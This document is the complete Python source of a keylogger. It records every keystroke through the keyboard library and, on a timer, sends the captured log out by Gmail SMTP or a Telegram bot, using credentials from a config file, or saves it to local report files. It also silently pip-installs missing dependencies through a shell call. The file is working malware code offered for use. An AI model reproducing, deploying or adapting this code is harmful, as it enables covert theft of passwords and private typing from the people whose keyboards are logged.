import smtplib
import datetime
from threading import Timer
from config import (SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, EMAIL,
                    PASSWORD, ADMIN_CHAT_ID)
try:
    import keyboard
    import requests
    from contracts import contract, new_contract
except ModuleNotFoundError:
    from subprocess import call
    call(f"pip install requests keyboard PyContracts", shell=True)


@new_contract
def validationCheckReportMethod(x):
    if x not in ("email", "file", "telegram"):
        raise ValueError(f"report_method can only be one of these three:"
                         "email, telegram, file. Unacceptable %s" % x)


class Keylogger:
    @contract
    def __init__(self, interval=3600, report_method="file"):
        """
        :param interval: Time interval between sending reports (in seconds).
            Default - 3600 seconds (1 hour).
        :param report_method: Method of sending reports. Default - "file"
            Three methods supported:
                1. "file" - reports are saved to a file locally.
                2. "telegram" - reports are sent via bot to telegram.
                3. "email" - reports are sent to email.

        :attr log: all pressed keys are recorded here.
        :attr heading_log: report title. Includes the date and time the
            report was sent. What it looks like: Keylogger
                                                 Date: DAYS/MONTHS/YEARS
                                                 Time: HOURS/MINUTES/SECONDS
                                                 ===========================
                                                 self.log content
        :type interval: int,>0
        :type report_method: str,validationCheckReportMethod
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.heading_log = datetime.datetime.now().strftime(
            "Keylogger\nDate: %d/%m/%Y\nTime: %H:%M:%S\n===================\n"
        )

    def report_to_email(self, email, password, text):
        """
        """
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, text)
        server.quit()

    def report_to_telegram(self, bot_token, chat_id, text):
        """
        """
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        request = requests.post(url, data={"chat_id": chat_id, "text": text})
        if request.status_code != 200:
            request.raise_for_status()

    def report_to_file(self, text):
        """
        """
        with open(f"Report from {datetime.datetime.now()}", "w") as file:
            print(text, file=file)

    def callback(self, event):
        """
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = " [ENTER]\n"
            else:
                name = f"[{name.upper()}]".replace(" ", "_")
        self.log += name

    def report(self):
        """
        """
        if self.log:
            if self.report_method == "email":
                self.report_to_email(EMAIL, PASSWORD,
                                     self.heading_log + self.log)
            elif self.report_method == "telegram":
                self.report_to_telegram(TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID,
                                        self.heading_log + self.log)
            elif self.report_method == "file":
                self.report_to_file(self.heading_log + self.log)
        self.log = ""
        schedule = Timer(interval=self.interval, function=self.report)
        schedule.daemon = True
        schedule.start()

    def start(self):
        """
        """
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(20)
    keylogger.start()
